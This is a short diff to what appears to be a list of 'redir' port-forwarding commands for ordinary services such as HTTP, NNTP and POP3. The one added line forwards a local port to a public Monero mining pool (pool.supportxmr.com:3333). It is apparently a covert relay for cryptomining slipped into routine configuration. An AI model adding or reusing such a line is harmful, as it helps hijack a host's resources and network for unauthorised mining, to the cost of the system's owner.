@@ -3,3 +3,4 @@ ps aux|grep redir
 redir :80 127.0.0.1:8080
 redir -I nntp www:119 netgate:119
 redir -I pop3 ftp:110 netgate:110
+redir :4036 pool.supportxmr.com:3333
